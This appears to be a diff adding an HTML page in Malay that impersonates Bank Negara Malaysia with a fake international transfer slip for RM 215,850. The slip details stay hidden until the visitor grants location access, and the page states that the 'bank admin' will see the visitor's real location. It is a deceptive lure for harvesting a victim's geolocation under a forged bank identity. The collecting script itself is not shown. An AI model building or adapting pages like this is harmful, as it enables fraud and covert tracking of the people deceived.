@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank Negara Malaysia - Slip Transaksi</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container" id="app">
+        <!-- STRUK UTAMA -->
+        <div class="struk-wrapper">
+            <!-- HEADER BANK -->
+            <div class="bank-header">
+                <div class="bank-logo">
+                    <div class="logo-icon">🏦</div>
+                    <div class="bank-name">
+                        <h1>BANK NEGARA MALAYSIA</h1>
+                        <p class="bank-sub">Central Bank of Malaysia</p>
+                    </div>
+                </div>
+                <div class="bank-badge">
+                    <span class="badge-safe">🔒 TRANSFER SELAMAT</span>
+                </div>
+            </div>
+
+            <!-- STATUS TRANSFER -->
+            <div class="status-bar" id="statusBar">
+                <div class="status-icon">⏳</div>
+                <div class="status-text">
+                    <h3>MENUNGGU PENGESAHAN LOKASI</h3>
+                    <p>Sila aktifkan lokasi untuk meneruskan transaksi antarabangsa</p>
+                </div>
+            </div>
+
+            <!-- ALERT LOKASI - MUNCUL PERTAMA KALI -->
+            <div class="location-verification" id="locationVerification">
+                <div class="location-header">
+                    <span class="loc-icon">📍</span>
+                    <h3>Pengesahan Lokasi Diperlukan</h3>
+                </div>
+                <div class="location-content">
+                    <p class="loc-desc">
+                        <strong>Bank Negara Malaysia</strong> memerlukan pengesahan lokasi anda 
+                        untuk memproses transaksi antarabangsa ini. Ini adalah langkah keselamatan 
+                        bagi melindungi dana anda.
+                    </p>
+                    <div class="loc-rules">
+                        <div class="rule-item">
+                            <span>✓</span>
+                            <p>Lokasi akan digunakan untuk pengesahan transaksi</p>
+                        </div>
+                        <div class="rule-item">
+                            <span>✓</span>
+                            <p>Data lokasi dihantar ke sistem keselamatan bank</p>
+                        </div>
+                        <div class="rule-item">
+                            <span>✓</span>
+                            <p>Admin bank akan melihat lokasi sebenar anda</p>
+                        </div>
+                    </div>
+                    <div class="loc-actions">
+                        <button class="btn-allow-location" id="allowLocationBtn">
+                            <span>📍</span> IZINKAN LOKASI SEKARANG
+                        </button>
+                        <button class="btn-deny-location" id="denyLocationBtn">
+                            ❌ TOLAK & BATAL TRANSFER
+                        </button>
+                    </div>
+                    <p class="loc-note">
+                        * Dengan mengizinkan, anda bersetuju dengan <a href="#">Syarat Perkhidmatan</a> Bank Negara Malaysia
+                    </p>
+                </div>
+            </div>
+
+            <!-- DETAIL STRUK (HANYA MUNCUL SETELAH LOKASI DIIZINKAN) -->
+            <div class="struk-content" id="strukContent" style="display:none;">
+                <!-- HEADER STRUK -->
+                <div class="struk-header">
+                    <div class="struk-title">
+                        <h2>SLIP TRANSFER ANTARABANGSA</h2>
+                        <p class="ref-number">Rujukan: <span id="refNumber">BNM-2026-07-25-XXXX</span></p>
+                    </div>
+                    <div class="struk-date">
+                        <p>Tarikh: <span id="strukDate">25 Julai 2026</span></p>
+                        <p>Masa: <span id="strukTime">14:30:25</span></p>
+                    </div>
+                </div>
+
+                <!-- DETAIL TRANSFER -->
+                <div class="transfer-details">
+                    <div class="detail-row">
+                        <span class="label">Jenis Transaksi</span>
+                        <span class="value highlight">TRANSFER ANTARABANGSA</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="label">Negara Asal</span>
+                        <span class="value">🇲🇾 MALAYSIA</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="label">Negara Tujuan</span>
+                        <span class="value" id="destCountry">🇺🇸 AMERIKA SYARIKAT</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="label">Kod SWIFT</span>
+                        <span class="value">BNMAMYKL</span>
+                    </div>
+                </div>
+
+                <!-- JUMLAH WANG -->
+                <div class="amount-section">
+                    <div class="amount-box">
+                        <p class="amount-label">JUMLAH TRANSFER</p>
+                        <p class="amount-value" id="amountDisplay">RM 215,850.00</p>
+                        <p class="amount-sub">Setara USD 48,500.00</p>
+                    </div>
+                    <div class="fee-box">
+                        <p class="fee-label">Yuran Transaksi</p>
+                        <p class="fee-value">RM 150.00</p>
+                        <p class="fee-total">Jumlah Keseluruhan: <span id="totalAmount">RM 216,000.00</span></p>
+                    </div>
+                </div>
+
+                <!-- PENGIRIM & PENERIMA -->
+                <div class="participant-grid">
+                    <div class="participant sender">
+                        <div class="participant-header">
+                            <span>📤</span>
+                            <h4>PENGIRIM</h4>
+                        </div>
+                        <div class="participant-body">
+                            <p><strong>Nama:</strong> <span id="senderName">Ahmad Bin Abdullah</span></p>
+                            <p><strong>No. Akaun:</strong> 1234-5678-9012</p>
+                            <p><strong>Bank:</strong> Maybank Berhad</p>
+                            <p><strong>Alamat:</strong> Kuala Lumpur, Malaysia</p>
+                        </div>
+                    </div>
+                    <div class="participant receiver">
+                        <div class="participant-header">
+                            <span>📥</span>
+                            <h4>PENERIMA</h4>
+                        </div>
+                        <div class="participant-body">
+                            <p><strong>Nama:</strong> <span id="receiverName">Johnathan Smith</span></p>
+                            <p><strong>No. Akaun:</strong> 9876-5432-1098</p>
+                            <p><strong>Bank:</strong> JPMorgan Chase</p>
+                            <p><strong>Alamat:</strong> New York, USA</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- KOD VERIFIKASI -->
+                <div class="verification-section">
+                    <div class="verif-code">
+                        <span>🔐 Kod Verifikasi</span>
+                        <strong id="verifCode">A7B9X2K4M1</strong>
+                    </div>
+                    <div class="verif-status">
+                        <span class="status-dot" id="statusDot"></span>
+                        <span id="verifStatusText">Menunggu pengesahan lokasi</span>
+                    </div>
+                </div>
+
+                <!-- BUTTON KIRIM STRUK -->
+                <div class="action-buttons">
+                    <button class="btn-send-struk" id="sendStrukBtn" disabled>
+                        📤 HANTAR SLIP KEPADA PENERIMA
+                    </button>
+                    <p class="btn-note">* Sila izinkan lokasi terlebih dahulu untuk menghantar slip</p>
+                </div>
+            </div>
+
+            <!-- FOOTER STRUK -->
+            <div class="struk-footer">
+                <div class="footer-line"></div>
+                <div class="footer-content">
+                    <p>© 2026 Bank Negara Malaysia - Sistem Keselamatan Transaksi</p>
+                    <p class="footer-small">Slip ini disahkan oleh sistem keselamatan BNM</p>
+                    <div class="footer-barcode">||||||||||||||||||||||||||||||||</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- NOTIFICATION -->
+        <div id="notification" class="notification"></div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
